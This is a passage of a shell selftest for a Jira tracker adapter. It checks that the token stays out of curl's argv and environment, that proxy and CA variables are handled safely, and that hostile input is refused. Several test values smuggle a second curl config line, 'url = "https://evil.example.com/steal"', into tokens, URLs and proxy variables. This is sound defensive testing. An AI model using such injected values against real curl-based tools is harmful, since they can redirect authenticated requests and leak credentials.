  gf-required)                   write_ok; write_body "\$FIXDIR/cloud-getfields-required.json" ;;
  gf-hostile)                    write_ok; write_body "\$FIXDIR/cloud-getfields-hostile.json" ;;
  pf-*)                          write_ok; write_body "\$FIXDIR/\$KIT_TJ_FIXTURE.json" ;;
  forbidden)
    [ -n "\$hdr" ] && printf 'HTTP/1.1 403 Forbidden\r\n\r\n' > "\$hdr"; [ -n "\$out" ] && : > "\$out" ;;
  curl-fail)                     exit 7 ;;
  contract-status)               write_ok; write_body "\$FIXDIR/contract-status.json" ;;
  contract-field)                write_ok; write_body "\$FIXDIR/contract-field.json" ;;
  *) write_ok; [ -n "\$out" ] && printf '{}' > "\$out" ;;
esac
# TRACKER-ADAPTER-PROXY-PASSTHROUGH: stand in for curl's write-out of %{http_connect} (stdout), when a leg names one.
if [ -f "\$_tj_shim_dir/.httpconnect" ]; then cat "\$_tj_shim_dir/.httpconnect"; fi
exit 0
SHIMEOF
  chmod +x "$shim"
  _TJ_CURL_BIN="$shim"
  argvlog="$tmpd/argv.log"
  printf '%s' "$argvlog" > "$tmpd/.argvlog-path"
  export KIT_TRACKER_USER="user@example.com"
  export KIT_TRACKER_TOKEN="s3cr3t-token-XYZ"
  export KIT_TRACKER_AUTH="basic"
  # fix1 Minor-4: also clear any leftover `.fixture-seq` from an earlier, incompletely-drained
  # `_tj_fxseq` sequence — the shim below reads `.fixture-seq` FIRST whenever it is non-empty, so a
  # stale queue would otherwise silently outrank this call's own single fixture.
  _tj_fx() { printf '%s' "$1" > "$tmpd/.fixture"; rm -f "$tmpd/.fixture-seq"; }
  # T2b1: a page-fetch SEQUENCE — pops one name per shim invocation (see the shim body above).
  _tj_fxseq() { printf '%s\n' "$@" > "$tmpd/.fixture-seq"; }

  _tj_st_transport
  _tj_st_proxy
  _tj_st_get_issue_perms
  _tj_st_writes
  _tj_st_createmeta
  _tj_st_required
  _tj_st_writable_keys
  _tj_st_transition_fields
  _tj_st_transition_list
  _tj_st_getfields
  _tj_st_createfrag
  _tj_st_status_ids
  _tj_st_list_in_states
  _tj_st_search_cloud
  _tj_st_search_dc
  _tj_st_search_exact_oracle
  _tj_st_search_dc_tail
  _tj_st_search_hardening
  _tj_st_signals_tempfiles
  _tj_st_assignee
  _tj_st_label_counts
  _tj_st_field_empty
  _tj_st_rundir_oracle
  _tj_st_structure
  _tj_st_contract_read
  _tj_st_preflight_reads
  _tj_st_contract_tier

  rm -rf "$tmpd"; trap - EXIT INT TERM
  [ "$sfail" -eq 0 ] && { echo "OK: tracker-jira selftest"; return 0; } || { echo "FAIL: tracker-jira selftest"; return 1; }
}

# _tj_st_*: the selftest's legs, grouped by op (TRACKER-JIRA-SELFTEST-SPLIT). Called only from _tj_selftest.
_tj_st_transport() {
  : > "$argvlog"
  _tj_fx cloud-issue-good
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || true
  # --- T5/J4 load-bearing negative: token never on curl argv ---
  if grep -q "s3cr3t-token-XYZ" "$argvlog" 2>/dev/null; then
    echo "FAIL: selftest — the token appeared on curl's argv"; sfail=1
  else
    echo "PASS: selftest — the token never appears on curl's argv (T5/J4)"
  fi

  # --- F1: env -i actually scrubs curl's environment (not just argv) — a sentinel exported into
  # THIS process must not survive into the curl call's own environment, and neither must the
  # token (which the -K stdin config carries — it must never ALSO be ambient). ---
  export KIT_TJ_SENTINEL_DO_NOT_LEAK="sentinel-marker-should-be-scrubbed"
  rm -f "$tmpd/.shimenv"
  _tj_fx cloud-issue-good
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || true
  unset KIT_TJ_SENTINEL_DO_NOT_LEAK
  if [ -f "$tmpd/.shimenv" ] && ! grep -q "KIT_TJ_SENTINEL_DO_NOT_LEAK" "$tmpd/.shimenv" 2>/dev/null \
     && ! grep -q "s3cr3t-token-XYZ" "$tmpd/.shimenv" 2>/dev/null; then
    echo "PASS: selftest — env -i scrubs a caller sentinel AND the token from curl's own environment (F1)"
  else
    echo "FAIL: selftest — curl's environment carried the sentinel or the token (F1 — env -i not load-bearing): $(cat "$tmpd/.shimenv" 2>/dev/null | grep -i 'kit_tj_sentinel\|s3cr3t' )"; sfail=1
  fi

  # --- B-1: a credential with a newline (curl -K injection) is refused BEFORE any request ---
  : > "$argvlog"
  rc=0
  KIT_TRACKER_USER="user@example.com" KIT_TRACKER_TOKEN="$(printf 'a\nurl = "https://evil.example.com/steal"')" \
    KIT_TRACKER_AUTH=basic tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a newline-bearing credential is refused before any request (B-1)"
  else
    echo "FAIL: selftest — a newline-bearing credential was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # --- B-1: a credential with a CR is refused ---
  rc=0
  KIT_TRACKER_USER="user@example.com" KIT_TRACKER_TOKEN="$(printf 'a\rurl = "https://evil.example.com/steal"')" \
    KIT_TRACKER_AUTH=basic tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — a CR-bearing credential is refused (B-1)" \
    || { echo "FAIL: selftest — a CR-bearing credential was not refused (rc=$rc)"; sfail=1; }
  # --- B-1: a credential with an ESC control byte is refused ---
  rc=0
  KIT_TRACKER_USER="user@example.com" KIT_TRACKER_TOKEN="$(printf 'a\033b')" \
    KIT_TRACKER_AUTH=basic tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — a control-byte credential is refused (B-1)" \
    || { echo "FAIL: selftest — a control-byte credential was not refused (rc=$rc)"; sfail=1; }
  # --- B-1: quote/backslash still refused (the ORIGINAL check, kept) ---
  rc=0
  KIT_TRACKER_USER='a"b' KIT_TRACKER_TOKEN=tok KIT_TRACKER_AUTH=basic \
    tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — a quote-bearing credential is refused (B-1)" \
    || { echo "FAIL: selftest — a quote-bearing credential was not refused (rc=$rc)"; sfail=1; }

  # --- MEDIUM-A: jira_curl_authed's OWN URL allowlist (BLOCKER-1b, the defence-in-depth line
  # right before the -K config) has its OWN non-vacuous legs — every _tj_id_ok caller-side check
  # already refuses a hostile id BEFORE it reaches this point, so without these legs `--selftest`
  # stays green even if the whole allowlist `case` block were deleted (measured: mutant M2 — the
  # block deleted — left every OTHER leg passing). Calls `jira_curl_authed` DIRECTLY, bypassing
  # every caller-side check, so this is the ONE leg that can only pass if THIS line refuses. ---
  KIT_TRACKER_USER="user@example.com"; export KIT_TRACKER_USER
  KIT_TRACKER_TOKEN="s3cr3t-token-XYZ"; export KIT_TRACKER_TOKEN
  KIT_TRACKER_AUTH="basic"; export KIT_TRACKER_AUTH
  : > "$argvlog"
  rc=0
  jira_curl_authed GET "$(printf 'https://ex.atlassian.net/x\nurl = "https://evil/"')" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — jira_curl_authed's own URL allowlist refuses a newline-bearing URL, pre-request (MEDIUM-A)"
  else
    echo "FAIL: selftest — a newline-bearing URL was not refused pre-request by jira_curl_authed itself (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  jira_curl_authed GET "https://ex.atlassian.net/x y" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — jira_curl_authed's own URL allowlist refuses a space-bearing URL, pre-request (MEDIUM-A)"
  else
    echo "FAIL: selftest — a space-bearing URL was not refused pre-request by jira_curl_authed itself (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  jira_curl_authed GET 'https://ex.atlassian.net/x"y' >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — jira_curl_authed's own URL allowlist refuses a quote-bearing URL, pre-request (MEDIUM-A)"
  else
    echo "FAIL: selftest — a quote-bearing URL was not refused pre-request by jira_curl_authed itself (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # positive control: a benign, real-shaped URL with a query string is NOT caught by the allowlist.
  _tj_fx cloud-issue-good
  rc=0
  jira_curl_authed GET "https://ex.atlassian.net/rest/api/3/issue/AB-7?fields=status,project" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 0 ] && echo "PASS: selftest — jira_curl_authed's URL allowlist admits a benign query-string URL (MEDIUM-A positive control)" \
    || { echo "FAIL: selftest — a benign query-string URL was wrongly refused by the URL allowlist (rc=$rc)"; sfail=1; }

  # --- H-1: an env-set _TJ_CURL_BIN is IGNORED on a REAL, SEPARATE production CLI dispatch ---
  # A genuine subprocess, not a structural/grep proxy. `jira_curl_authed` invokes curl under a
  # FIXED internal PATH (`/usr/bin:/bin:/usr/local/bin`), so a bogus _TJ_CURL_BIN pointing at a
  # canary binary elsewhere can only run if the production code path actually reads the env var —
  # the hardcoded `_TJ_CURL_BIN=curl` assignment at file scope means it never does. The subprocess
  # legitimately falls through to the REAL system curl and fails on an unroutable host (fast,
  # bounded by the 10s connect-timeout) — what matters is the canary log stays empty.
  # F2/N-2: `jira_curl_authed` invokes curl under `env -i`, which scrubs KIT_TJ_CANARY_LOG before
  # the canary could ever read it from its OWN environment — the original leg's canary log stayed
  # empty EVEN WHEN THE CANARY RAN, making the PASS branch vacuous (measured: under a
  # `${_TJ_CURL_BIN:-curl}` env-read mutant the canary executes but the log is still empty, and
  # the leg PASSes regardless). The log path is now baked into the canary's BODY as a literal
  # absolute path at file-creation time (the same technique the argv shim already uses for
  # `.argvlog-path`) — the canary writes to a path it carries in its own source, not one it reads
  # from an environment `env -i` is specifically designed to scrub.
  canarydir="$tmpd/canary"; mkdir -p "$canarydir"
  canarylog="$tmpd/canary.log"; : > "$canarylog"
  cat > "$canarydir/curl" <<EOF
#!/bin/sh
echo RAN-BOGUS-CURL >> "$canarylog"
exit 1
EOF
  chmod +x "$canarydir/curl"
  _tj_self=$(CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd)/scripts/tracker-jira.sh
  ( _TJ_CURL_BIN="$canarydir/curl"; export _TJ_CURL_BIN
    KIT_TRACKER_USER=user@example.com; export KIT_TRACKER_USER
    KIT_TRACKER_TOKEN=tok; export KIT_TRACKER_TOKEN
    sh "$_tj_self" get-issue https://198.51.100.1.invalid cloud AB AB-7 >/dev/null 2>&1
  ) || true
  if [ -s "$canarylog" ]; then
    echo "FAIL: selftest — a real subprocess honored the env-set _TJ_CURL_BIN (H-1 regression: token could reach an arbitrary binary)"; sfail=1
  else
    echo "PASS: selftest — a real subprocess ignored the env-set _TJ_CURL_BIN; the canary never ran (H-1)"
  fi

}
# _tj_st_proxy: TRACKER-ADAPTER-PROXY-PASSTHROUGH legs — the adapter hands curl a proxy ONLY through the
# stdin `-K` config (never env, never argv), allowlists each value first, and never trusts a CA variable.
# (_tj_selftest has already cleared the ambient proxy and CA variables.)
_tj_px_ok() {
  if [ "$2" -eq 1 ]; then echo "PASS: selftest — $1"; else echo "FAIL: selftest — $1"; sfail=1; fi
}
# _tj_px_refuse <label> <var> <value> <name-the-sentence-must-carry> <bytes-that-must-not-be-echoed>
_tj_px_refuse() {
  rm -f "$tmpd/.methods" "$tmpd/.lastcfg" "$tmpd/.pxerr"
  _pxr_rc=0
  ( export "$2=$3"; jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>"$tmpd/.pxerr" ) || _pxr_rc=$?
  _pxr_good=1
  [ "$_pxr_rc" -eq 1 ] || _pxr_good=0
  [ ! -s "$tmpd/.methods" ] || _pxr_good=0
  grep -q "$4" "$tmpd/.pxerr" 2>/dev/null || _pxr_good=0
  ! grep -qF "$5" "$tmpd/.pxerr" 2>/dev/null || _pxr_good=0
  _tj_px_ok "$1 is refused: rc 1, zero requests, the sentence names $4, the value is not echoed (proxy passthrough)" "$_pxr_good"
}
_tj_st_proxy() {
  _tj_fx cloud-issue-good
  _px_nl_proxy=$(printf 'http://p.example:3128\nurl = "https://evil.example.com/steal"')
  _px_nl_noproxy=$(printf 'a.example\nurl = "https://evil.example.com/steal"')

  # --- 1. config injection (the security negatives): every value shape x both values x both cases ---
  _tj_px_refuse "a newline plus a spoofed url in HTTPS_PROXY" HTTPS_PROXY "$_px_nl_proxy" HTTPS_PROXY evil.example.com
  _tj_px_refuse "a newline plus a spoofed url in https_proxy" https_proxy "$_px_nl_proxy" HTTPS_PROXY evil.example.com
  _tj_px_refuse "a quote in HTTPS_PROXY" HTTPS_PROXY 'http://p"x' HTTPS_PROXY 'p"x'
  _tj_px_refuse "a backslash in HTTPS_PROXY" HTTPS_PROXY 'http://p\x' HTTPS_PROXY 'p\x'
  _tj_px_refuse "a newline plus a spoofed url in NO_PROXY" NO_PROXY "$_px_nl_noproxy" NO_PROXY evil.example.com
  _tj_px_refuse "a newline plus a spoofed url in no_proxy" no_proxy "$_px_nl_noproxy" NO_PROXY evil.example.com
  _tj_px_refuse "a quote in NO_PROXY" NO_PROXY 'a.example"x' NO_PROXY 'a.example"x'
  _tj_px_refuse "a backslash in NO_PROXY" NO_PROXY 'a.example\x' NO_PROXY 'a.example\x'
  _tj_px_refuse "a socks5 scheme in HTTPS_PROXY" HTTPS_PROXY 'socks5://127.0.0.1:1080' HTTPS_PROXY 'socks5'
  _tj_px_refuse "an ftp scheme in HTTPS_PROXY" HTTPS_PROXY 'ftp://127.0.0.1:21' HTTPS_PROXY 'ftp://'
  _tj_px_refuse "a space in HTTPS_PROXY (the no-proxy list may carry one, the proxy may not)" HTTPS_PROXY 'http://p.example:3128 x' HTTPS_PROXY 'p.example'

  # --- 2. CA and TLS variables are never handed over (the negative): scrubbed by env -i, never a config line ---
  rm -f "$tmpd/.shimenv" "$tmpd/.lastcfg"
  ( export SSL_CERT_FILE=/nonexistent/ca-sentinel CURL_CA_BUNDLE=/nonexistent/ca-sentinel SSL_CERT_DIR=/nonexistent/ca-sentinel
    export HTTPS_PROXY=http://p.example:3128
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=1
  [ -s "$tmpd/.shimenv" ] || _px_good=0
  [ -s "$tmpd/.lastcfg" ] || _px_good=0
  grep -q '^proxy = "http://p.example:3128"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  for _px_n in SSL_CERT_FILE CURL_CA_BUNDLE SSL_CERT_DIR; do
    ! grep -q "$_px_n" "$tmpd/.shimenv" 2>/dev/null || _px_good=0
  done
  for _px_n in cacert capath insecure proxy-insecure proxy-cacert; do
    ! grep -q "^$_px_n" "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  done
  _tj_px_ok "SSL_CERT_FILE, CURL_CA_BUNDLE and SSL_CERT_DIR never reach curl's environment, and the config carries no cacert, capath, insecure or proxy-insecure line (proxy passthrough)" "$_px_good"

  # --- 3. the env scrub stands: the proxy (with a credential in it) reaches curl ONLY through the stdin config ---
  rm -f "$tmpd/.shimenv" "$tmpd/.lastcfg"; : > "$argvlog"
  ( export HTTPS_PROXY=http://pxuser:PXPW-SENTINEL@p.example:3128 https_proxy=http://pxuser:PXPW-SENTINEL@p.example:3128
    export NO_PROXY=internal.example no_proxy=internal.example
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=1
  [ -s "$tmpd/.shimenv" ] || _px_good=0
  ! grep -qi 'proxy' "$tmpd/.shimenv" 2>/dev/null || _px_good=0
  ! grep -q 'PXPW-SENTINEL' "$tmpd/.shimenv" 2>/dev/null || _px_good=0
  [ -s "$argvlog" ] || _px_good=0
  ! grep -q 'PXPW-SENTINEL' "$argvlog" 2>/dev/null || _px_good=0
  ! grep -qi 'proxy' "$argvlog" 2>/dev/null || _px_good=0
  grep -q '^proxy = "http://pxuser:PXPW-SENTINEL@p.example:3128"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  grep -q '^noproxy = "internal.example"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  _tj_px_ok "the proxy (credential included) is absent from curl's environment and argv and present in the stdin config (proxy passthrough, T5/J4 + F1)" "$_px_good"

  # --- 4. precedence: lowercase wins over uppercase, for both pairs; uppercase alone is honoured ---
  rm -f "$tmpd/.lastcfg"
  ( export https_proxy=http://lower.example:1 HTTPS_PROXY=http://UPPER.example:1 no_proxy=lower.example NO_PROXY=UPPER.example
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=1
  grep -q '^proxy = "http://lower.example:1"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  grep -q '^noproxy = "lower.example"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  ! grep -q 'UPPER' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  _tj_px_ok "https_proxy wins over HTTPS_PROXY and no_proxy wins over NO_PROXY, as curl itself would choose (proxy passthrough)" "$_px_good"
  rm -f "$tmpd/.lastcfg"
  ( export HTTPS_PROXY=http://UPPER.example:1 NO_PROXY=UPPER.example
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=1
  grep -q '^proxy = "http://UPPER.example:1"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  grep -q '^noproxy = "UPPER.example"$' "$tmpd/.lastcfg" 2>/dev/null || _px_good=0
  _tj_px_ok "HTTPS_PROXY and NO_PROXY alone are honoured (proxy passthrough)" "$_px_good"
  # a no-proxy list may carry commas, a star and a space
  rm -f "$tmpd/.lastcfg"
  ( export HTTPS_PROXY=http://p.example:3128 NO_PROXY='*.corp.example, 10.0.0.1'
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=0
  if grep -qF 'noproxy = "*.corp.example, 10.0.0.1"' "$tmpd/.lastcfg" 2>/dev/null; then _px_good=1; fi
  _tj_px_ok "a NO_PROXY list with commas, a star and a space is admitted (proxy passthrough positive control)" "$_px_good"

  # --- 4b. with neither variable set the config is byte-identical to the one before this row ---
  rm -f "$tmpd/.lastcfg"
  jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 || true
  printf 'user = "user@example.com:s3cr3t-token-XYZ"\n\nrequest = "GET"\nurl = "https://ex.atlassian.net/rest/api/3/myself"\nsilent\nshow-error\nproto = "=https"\ngloboff\nmax-redirs = 0\nconnect-timeout = 10\nmax-time = 30\n' > "$tmpd/.cfg-want"
  _px_good=0
  if cmp -s "$tmpd/.cfg-want" "$tmpd/.lastcfg"; then _px_good=1; fi
  _tj_px_ok "with no proxy variable set the -K config is byte-identical to the one before this row (proxy passthrough)" "$_px_good"

  # --- 5. the route the probe reports: via proxy | direct (curl's own %{http_connect}) ---
  _tj_px_via() { # <label> <want> <http_connect-the-shim-prints> <proxy-or-empty> [<no-proxy>]
    printf '%s' "$3" > "$tmpd/.httpconnect"
    _tj_fx pf-myself-atlassian
    _pxv_out=$( export HTTPS_PROXY="$4"; [ -n "$4" ] || unset HTTPS_PROXY; if [ -n "${5:-}" ]; then export NO_PROXY="$5"; fi; tj_contract_read https://ex.atlassian.net cloud probe 2>/dev/null ) || _pxv_out="RC=$?"
    rm -f "$tmpd/.httpconnect"
    case "$_pxv_out" in
      *"via	$2") _tj_px_ok "$1" 1 ;;
      *) _tj_px_ok "$1 (got: $_pxv_out)" 0 ;;
    esac
  }
  _tj_px_via "probe via: a proxy and a non-zero http_connect prints 'via proxy'" proxy 200 http://p.example:3128
  _tj_px_via "probe via: a proxy that curl skipped (http_connect 000, e.g. NO_PROXY matched) prints 'via direct'" direct 000 http://p.example:3128
  _tj_px_via "probe via: no proxy prints 'via direct'" direct '' ''
  _tj_px_via "probe via: NO_PROXY set with no proxy still prints 'via direct', not unknown (R1)" direct '' '' 'internal.example'
  # a refused proxy value is a named reach state, not an unreadable probe (N1)
  _px_want=$(printf 'reach\tproxy-refused\nauth\tunknown\ntype\tunknown\nvia\tunknown')
  _tj_fx pf-myself-atlassian
  # shellcheck disable=SC2089 # the literal quote IS the hostile byte under test
  _px_out=$( export HTTPS_PROXY='http://p"x'; tj_contract_read https://ex.atlassian.net cloud probe 2>/dev/null ) || _px_out="RC=$?"
  _px_good=0
  if [ "$_px_out" = "$_px_want" ]; then _px_good=1; fi
  _tj_px_ok "probe: a refused HTTPS_PROXY prints reach proxy-refused (proxy passthrough)" "$_px_good"
  # shellcheck disable=SC2089 # the literal quote IS the hostile byte under test
  _px_out=$( export NO_PROXY='a"b'; tj_contract_read https://ex.atlassian.net cloud probe 2>/dev/null ) || _px_out="RC=$?"
  _px_good=0
  if [ "$_px_out" = "$_px_want" ]; then _px_good=1; fi
  _tj_px_ok "probe: a refused NO_PROXY prints reach proxy-refused (proxy passthrough)" "$_px_good"

  # --- 7. invalid UTF-8 and accented bytes: the check must see exactly the bytes that would be written ---
  _px_lc_had=${LC_ALL+set}; _px_lc_old=${LC_ALL:-}
  LC_ALL=en_US.UTF-8; export LC_ALL
  _px_ff_q=$(printf 'a.example\377"')
  _px_ff_nl=$(printf 'a.example\377\nurl = "https://evil.invalid"')
  _px_pff_q=$(printf 'http://p.example\377"')
  _px_pff_nl=$(printf 'http://p.example\377\nurl = "https://evil.invalid"')
  _px_eacute=$(printf 'caf\303\251')
  _tj_px_refuse "NO_PROXY with an invalid byte before a quote (UTF-8 locale)" NO_PROXY "$_px_ff_q" NO_PROXY 'a.example'
  _tj_px_refuse "NO_PROXY with an invalid byte before a newline and a spoofed url (UTF-8 locale)" NO_PROXY "$_px_ff_nl" NO_PROXY 'evil.invalid'
  _tj_px_refuse "NO_PROXY with an accented letter (UTF-8 locale)" NO_PROXY "$_px_eacute" NO_PROXY 'caf'
  _tj_px_refuse "HTTPS_PROXY with an invalid byte before a quote (UTF-8 locale)" HTTPS_PROXY "$_px_pff_q" HTTPS_PROXY 'p.example'
  _tj_px_refuse "HTTPS_PROXY with an invalid byte before a newline and a spoofed url (UTF-8 locale)" HTTPS_PROXY "$_px_pff_nl" HTTPS_PROXY 'evil.invalid'
  _tj_px_refuse "HTTPS_PROXY with an accented letter (UTF-8 locale)" HTTPS_PROXY "http://$_px_eacute" HTTPS_PROXY 'caf'
  # the credential check, the same latent class: refused directly and through the primitive, zero requests
  _px_good=1
  for _px_v in "$_px_ff_q" "$(printf 'tok\377\nurl = "https://evil.invalid"')" "$_px_eacute"; do
    if _tj_cred_ok "$_px_v"; then _px_good=0; fi
  done
  _tj_cred_ok 'user@example.com' || _px_good=0
  _tj_px_ok "_tj_cred_ok refuses an invalid byte and an accented letter under a UTF-8 locale and still admits an email (proxy passthrough)" "$_px_good"
  rm -f "$tmpd/.methods"
  _px_rc=0
  ( KIT_TRACKER_TOKEN=$(printf 'tok\377\nurl = "https://evil.invalid"'); export KIT_TRACKER_TOKEN
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || _px_rc=$?
  _px_good=0
  if [ "$_px_rc" -eq 1 ] && [ ! -s "$tmpd/.methods" ]; then _px_good=1; fi
  _tj_px_ok "a credential with an invalid byte before a spoofed url is refused, rc 1, zero requests (UTF-8 locale)" "$_px_good"
  # positive: an accepted no-proxy list emits exactly one noproxy line and exactly one url line
  rm -f "$tmpd/.lastcfg"
  # shellcheck disable=SC2090 # the quoted-looking value is deliberate: a space and a star in a no-proxy list
  ( export HTTPS_PROXY=http://p.example:3128 NO_PROXY='*.corp.example, 10.0.0.1'
    jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _px_good=0
  if [ "$(grep -c '^noproxy = ' "$tmpd/.lastcfg" 2>/dev/null)" = 1 ] && [ "$(grep -c '^url = ' "$tmpd/.lastcfg" 2>/dev/null)" = 1 ]; then _px_good=1; fi
  _tj_px_ok "an accepted no-proxy list emits exactly one noproxy line and exactly one url line (UTF-8 locale)" "$_px_good"
  if [ "$_px_lc_had" = set ]; then LC_ALL=$_px_lc_old; export LC_ALL; else unset LC_ALL; fi

  # --- 6. real curl routes through the line: a fixture CONNECT logger on 127.0.0.1 (no external network) ---
  _tj_px_fixture
}
# _tj_px_fixture: real curl (never the shim) pointed at a local CONNECT logger — proves the `proxy =` line
# actually routes. SKIP if python3 or a local bind is unavailable, but a FAIL in CI.
_tj_px_fixture() {
  _pxf_dir="$tmpd/pxfix"; mkdir -p "$_pxf_dir"
  : > "$_pxf_dir/log"
  cat > "$_pxf_dir/proxy.py" <<'PYEOF'
import socket, sys
portfile, logfile = sys.argv[1], sys.argv[2]
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 0))
srv.listen(8)
with open(portfile, "w") as pf:
    pf.write(str(srv.getsockname()[1]))
while True:
    conn, _ = srv.accept()
    conn.settimeout(5)
    try:
        first = conn.recv(4096).split(b"\r\n")[0].decode("ascii", "replace")
        with open(logfile, "a") as lf:
            lf.write(first + "\n")
    except Exception:
        pass
    conn.close()
PYEOF
  _pxf_skip=""
  command -v python3 >/dev/null 2>&1 || _pxf_skip="python3 is not installed"
  if [ -z "$_pxf_skip" ]; then
    python3 "$_pxf_dir/proxy.py" "$_pxf_dir/port" "$_pxf_dir/log" 2>/dev/null &
    _tj_px_pid=$!
    _pxf_i=0
    while [ ! -s "$_pxf_dir/port" ] && [ "$_pxf_i" -lt 50 ]; do sleep 0.1; _pxf_i=$((_pxf_i + 1)); done
    [ -s "$_pxf_dir/port" ] || _pxf_skip="local bind refused"
  fi
  if [ -n "$_pxf_skip" ]; then
    if [ "${CI:-}" = true ]; then
      echo "FAIL: selftest — the fixture CONNECT proxy could not run in CI ($_pxf_skip) (proxy passthrough)"; sfail=1
    else
      echo "SKIP: selftest — the fixture CONNECT proxy leg ($_pxf_skip)"
    fi
    [ -z "${_tj_px_pid:-}" ] || { kill "$_tj_px_pid" 2>/dev/null || true; wait "$_tj_px_pid" 2>/dev/null || true; _tj_px_pid=""; }
    return 0
  fi
  _pxf_port=$(cat "$_pxf_dir/port")
  _pxf_save=$_TJ_CURL_BIN; _TJ_CURL_BIN=curl
  ( export HTTPS_PROXY="http://127.0.0.1:$_pxf_port"; jira_curl_authed GET https://ex.atlassian.net/rest/api/3/myself >/dev/null 2>&1 ) || true
  _pxf_with=$(cat "$_pxf_dir/log")
  : > "$_pxf_dir/log"
  # no proxy variable: the target must be a name that can never resolve, so nothing leaves this machine
  jira_curl_authed GET https://ex.invalid/rest/api/3/myself >/dev/null 2>&1 || true
  _pxf_without=$(cat "$_pxf_dir/log")
  _TJ_CURL_BIN=$_pxf_save
  kill "$_tj_px_pid" 2>/dev/null || true; wait "$_tj_px_pid" 2>/dev/null || true; _tj_px_pid=""
  case "$_pxf_with" in
    "CONNECT ex.atlassian.net:443"*) _tj_px_ok "real curl with HTTPS_PROXY pointed at the fixture sends CONNECT ex.atlassian.net:443 (proxy passthrough)" 1 ;;
    *) _tj_px_ok "real curl with HTTPS_PROXY pointed at the fixture did not send CONNECT ex.atlassian.net:443 (log: '$_pxf_with')" 0 ;;
  esac
  _px_good=0
  if [ -z "$_pxf_without" ]; then _px_good=1; fi
  _tj_px_ok "real curl without the proxy variable never touches the fixture (proxy passthrough)" "$_px_good"
}
_tj_st_get_issue_perms() {

  # --- positive: good-issue succeeds and returns the status id (recorded Cloud fixture) ---
  _tj_fx cloud-issue-good
  out=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>/dev/null) || out="RC=$?"
  case "$out" in
    *"status-id	3"*) echo "PASS: selftest — get-issue returns the status id on a recorded Cloud fixture" ;;
    *) echo "FAIL: selftest — get-issue did not return status-id 3 (got: $out)"; sfail=1 ;;
  esac

  # --- T3: Data Center (v2) yields the same §4.3 shape as Cloud (v3), recorded DC fixture ---
  _tj_fx dc-issue-good
  out_dc=$(tj_get_issue https://ex.example.com datacenter AB AB-7 2>/dev/null) || out_dc="RC=$?"
  if [ "$out_dc" = "$out" ] && grep -q '/rest/api/2/' "$tmpd/.lasturl" 2>/dev/null; then
    echo "PASS: selftest — datacenter flavour selects REST v2 and yields the same §4.3 shape as cloud v3 (T3), recorded fixture"
  else
    echo "FAIL: selftest — datacenter (v2) diverged from cloud (v3) (dc='$out_dc' cloud='$out')"; sfail=1
  fi

  # --- S-4 negative 1: cross-project id refused BEFORE any request (no shim call) ---
  : > "$argvlog"
  _tj_fx cloud-issue-good
  if tj_get_issue https://ex.atlassian.net cloud AB ZZ-7 >/dev/null 2>&1; then
    echo "FAIL: selftest — a cross-project id was wrongly accepted (S-4)"; sfail=1
  else
    if [ -s "$argvlog" ]; then
      echo "FAIL: selftest — a cross-project id still reached curl (S-4 pre-check bypassed)"; sfail=1
    else
      echo "PASS: selftest — a cross-project id is refused before any request (S-4)"
    fi
  fi

  # --- S-4 negative 2: spoofed-project response refused AFTER the request (recorded fixture) ---
  _tj_fx cloud-issue-spoofed-project
  err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || true
  if [ -n "$err" ] && ! printf '%s' "$err" | grep -q "ZZ\|Not-AB"; then
